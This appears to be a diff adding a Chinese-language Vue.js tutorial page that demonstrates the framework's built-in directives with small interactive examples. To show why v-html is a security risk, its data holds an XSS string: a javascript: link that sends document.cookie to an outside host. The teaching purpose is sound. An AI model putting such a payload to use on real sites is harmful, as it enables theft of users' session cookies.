@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>内置指令</title>
+    <script type="application/javascript" src="../../js/vue.js"></script>
+    <style>
+        /* 属性选择器 []{} */
+        [v-cloak] {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+<div id="root">
+    <h2>insert</h2>
+    <p>{{str}}</p>
+    <p>{{str2}}</p>
+    <hr>
+    <h2>v-text</h2>
+    v-text 相较于{{}}插值语法,其会替换标签中原有的内容
+    <p v-text="str">str</p>
+    <p v-text="xss">str</p>
+    <hr>
+    <h2>v-html</h2>
+    v-html 相较于v-text 其将会解析内容中的 HTML标签 可能会导致安全问题
+    <p v-html="str"></p>
+    <p v-html="xss"></p>
+    <hr>
+    <h2>v-bind</h2>
+    v-bind 可以将数据绑定到一个属性值中 可以使用 :key来缩略<br/>
+    <a v-bind:href="src">点击跳转</a><br/>
+    <a :href="src">点击跳转</a>
+    <hr>
+    <h2>v-model</h2>
+    v-model 可以将交互内容双向绑定 即用户修改后可以data中的值也会随着改变 可以使用v-model:来缩略
+    <p>{{num}}</p>
+    <input type="number" v-model:value="num"><br/>
+    <input type="number" v-model="num"><br/>
+    <a href="../09-inputform-vue/index.html">更多内容</a>
+    <hr>
+    <h2>v-on</h2>
+    v-on 可以对事件进行监听处理 可以使用@进行缩略 同时可以使用修饰符
+    <p>{{num}}</p>
+    <button v-on:click="num++">{{num}}++</button>
+    <br/>
+    <button @click="num++">{{num}}++</button>
+    <br/>
+    <button @click.once="num++">{{num}}++Once</button>
+    <br/>
+    <a href="../03-envent-vue/index.html">更多</a>
+    <hr>
+    <h2>v-if-else与v-show</h2>
+    v-if v-else-if v-else 可以配合来控制流程 当未false时其结构体将直接会被移除,v-show未false时仅仅只是将display改为non
+    <p>{{num}}</p>
+    <button @click="num++">{{num}}++</button>
+    <p v-if="num%2===1">num为奇数</p>
+    <p v-else>num为偶数</p>
+    <p v-if="num%3===0">num为3的倍数</p>
+    <p v-else-if="num%5===0">num为5的倍数</p>
+    <p v-else>num不为3或5的倍数</p>
+    <p v-show="num<10">num不大于10</p>
+    <hr>
+    <h2>v-for</h2>
+    v-for 可以用来循环遍历 格式为 v-for='v,i in list' v为内容 i为索引 其中可以设置 v-key= 若未设置时 v-key将默认为索引<br/>
+    <input type="text" v-model="val" @keydown.enter="add">按回车添加
+    <ul>
+        <li>index-str--opt</li>
+        <li v-for="(s,i) in list">{{i}}---{{s}}--
+            <button @click="list.splice(i,1)">del</button>
+        </li>
+    </ul>
+    <hr>
+    <h2>v-cloak与v-pre</h2>
+    v-cloak 属性将在VUE被引入的一瞬间被移除，用于配合其他内容(例如CSS属性选择器)来制作VUE因网络或其他原因未接管时的页面显示问题<br/>
+    v-pre 可以让VUE跳过被标记的结构体提高编译效率（其中的插值和其他语法将不会被执行)
+    <p v-cloak>{{str}}</p>
+    <p v-pre>{{str}} v-pre</p>
+    <hr>
+    <h2>v-once</h2>
+    v-once 属性标记的内容在初次渲染后就被视为静态内容 当内容改变后不会在渲染
+    <p v-once>初始大小:{{num}}</p>
+    <p>当前大小:{{num}}</p>
+    <button v-on:click="num++">num++</button>
+    <hr>
+</div>
+<script type="application/javascript">
+    const vm = new Vue({
+        data: {
+            src: 'http://baidu.com',
+            num: 1,
+            str: "<h1>这是H1标签<h1/>",
+            str2: "{{str}}",
+            val: "",
+            list: [
+                "WH",
+                "JM",
+                "JZ",
+                "XG",
+                "XY",
+                "SY",
+                "HS",
+                "HG",
+            ],
+            /* document.cookie 可以获取当前页面的全部cookie  （httponly除外） */
+            xss: '<a href=javascript:location.href="http://baidu.com?"+document.cookie>点击跳转<a/>'
+        },
+        methods: {
+            add() {
+                this.list.push(this.val)
+            }
+        }
+    })
+    vm.$mount('#root')
+</script>
+</body>
+</html>
